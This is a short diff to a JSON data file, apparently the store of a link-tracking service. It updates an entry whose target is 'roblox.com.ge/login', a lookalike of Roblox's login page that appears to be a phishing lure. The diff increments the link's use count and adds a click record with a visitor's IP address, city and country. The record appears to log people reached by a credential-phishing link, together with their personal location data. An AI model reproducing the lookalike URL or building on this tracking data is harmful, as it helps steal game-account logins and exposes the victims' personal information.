@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1708,
+    "useCount": 1709,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13832,6 +13832,14 @@
         "city": "Ensenada",
         "flag": "🇲🇽",
         "countryCode": "MX"
+      },
+      {
+        "timestamp": 1777681167433,
+        "ip": "179.7.180.59",
+        "country": "Peru",
+        "city": "Arequipa",
+        "flag": "🇵🇪",
+        "countryCode": "PE"
       }
     ]
   },
